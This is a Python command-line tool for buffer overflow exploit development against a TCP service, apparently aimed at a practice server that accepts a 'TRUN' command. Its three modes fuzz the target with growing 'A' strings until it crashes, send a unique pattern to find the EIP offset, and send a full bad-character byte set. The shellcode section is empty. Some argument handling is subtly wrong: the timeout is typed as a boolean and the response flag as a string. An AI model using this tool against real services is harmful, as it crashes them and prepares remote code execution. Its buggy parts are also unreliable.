'''
A dumb buffer overflow script that fuzzes target server:
- Integrated `metasploit-framework/tools/exploit/pattern_create.rb -l & -q` for offset finding
- Bad character testing

Usage:
- Fuzz:
    python .\main.py --target 192.168.217.133 --port 9999 --command "TRUN /.:/"  --mode fuzz

- Offset + EIP:
    python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode offset --olength 2400

- Bad Character Tests:
    python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode badchar --blength 2003
'''

import argparse
import socket
from time import sleep
from math import ceil


# Find out the amount of bytes it takes for the target program to crash
def fuzz(target: str, port: int, expect_resp: bool, stride: int, command_prefix: str, timeout_secs: int) -> int:
    payload = "A" * stride

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(timeout_secs)
        sock.connect((target, port))
        while True:
            try:
                print("send %s bytes" % len(payload))
                sock.send((command_prefix + payload).encode("utf-8"))
                if expect_resp:
                    sock.recv(1024)
                payload += "A" * stride
                sleep(1)
            except Exception as e:
                print(e)
                return len(payload)


# Send a chunk of unique pattern'd data to target server
def send_chunk(target: str, port: int, command_prefix: str, sequence: str, send_raw: bool = False):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target, port))
        print("send %s bytes" % len(sequence))
        # Bad Character needs to be sent raw, otherwise there will be C0 characters
        # However, other payloads need to be encoded to utf-8 otherwise EIP value will be wrong
        # This might have something to do with Little Endian
        if send_raw:
            sock.send(bytes(command_prefix + sequence, "raw_unicode_escape"))
        else:
            sock.send((command_prefix + sequence).encode("utf-8"))
        print("sent")


def find_offset(sequence: str) -> int:
    le_hex = input("Enter EIP value:")
    # since windows uses little endian, the value is reversed
    #   e.g. 386F4337 => 8oC7 => 7Co8
    substr = bytearray.fromhex(le_hex).decode()[::-1]
    return sequence.find(substr)


# A lazy sequence implementation of `pattern_create` from `rapid7/rex-text`
# {UPPER, LOWER, NUMBER}
# Unique iteration length = 26 * 26 * 10 * 3 = 20280
def generate_unique_pattern(length) -> str:
    upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    lower = upper.lower()
    num = "0123456789"
    res = ""
    # In case the required length is over 20280
    iterations = ceil(length // 20280)
    for _ in range(iterations + 1):
        for u in upper:
            for l in lower:
                for n in num:
                    queue = [n, l, u]
                    while len(res) < length:
                        res += queue.pop()
                        if not queue:
                            break
    return res


# Arguments
parser = argparse.ArgumentParser(description="Dumb fuzzing tool")

# -- Mode --
parser.add_argument("--mode", type=str,
                    help="[required] attack mode: fuzz|offset|badchar")
# -- Target --
parser.add_argument("--target", type=str, help="[required] target server")
parser.add_argument("--port", type=int, help="[required] target port")

parser.add_argument(
    "-resp", type=str, help="whether the command would return a response. default true", default=True)
parser.add_argument("--timeout", type=bool,
                    help="[optional] timeout in seconds if program didn't respond. default 5", default=5)
parser.add_argument("--prefix", type=str,
                    help="[optional] command prefix. default empty", default="")
# -- Fuzz --
parser.add_argument("--stride", type=int,
                    help="[optional] number in bytes to increment for each fuzzing iteration. default 100", default=100)
# -- Offset --
parser.add_argument("--olength", type=int,
                    help="[optional] unique pattern of strings at given length to be sent. default 2000", default=2000)

# -- Bad Character --
# FIXME: Make arguments required conditionally
parser.add_argument("--blength", type=int,
                    help="[optinoal] offset right before EIP location, used for testing bad characters", default=0)

# -- Shellcode --


# Main Program
args = parser.parse_args()

mode = args.mode.lower()

if mode == "fuzz":
    len_crash_bytes = fuzz(args.target, args.port,
                           args.resp, args.stride, args.prefix, args.timeout)
    print("Program crashed at %s bytes", len_crash_bytes)

elif mode == "offset":
    seq = generate_unique_pattern(args.olength)
    send_chunk(args.target, args.port, args.prefix, seq)
    offset = find_offset(seq)
    print("offset is at", offset)

elif mode == "badchar":
    # Generate 0x01 to 0xff into a string
    badchars = "".join([chr(h) for h in range(1, 256)])
    # As the stack size might be limited, we place this full set of bad characters inside heap
    payload = args.blength * "A" + "B" * 4 + badchars
    print("sending bad character test payload:", payload)
    send_chunk(args.target, args.port, args.prefix, payload, True)

else:
    print("[ERROR] attack mode invalid")
